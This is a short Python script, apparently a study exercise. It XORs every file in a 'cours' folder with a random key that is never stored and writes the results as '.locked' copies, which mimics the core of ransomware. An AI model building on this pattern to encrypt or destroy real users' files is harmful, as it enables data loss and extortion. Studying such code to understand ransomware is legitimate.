from pathlib import Path
from secrets import token_bytes


folder = Path("cours")
key = token_bytes(8)

files = [path for path in folder.rglob("*") if path.is_file()]

for path in files:
    data = path.read_bytes()
    encrypted = bytes(byte ^ key[index % len(key)] for index, byte in enumerate(data))
    path.with_name(path.name + ".locked").write_bytes(encrypted)
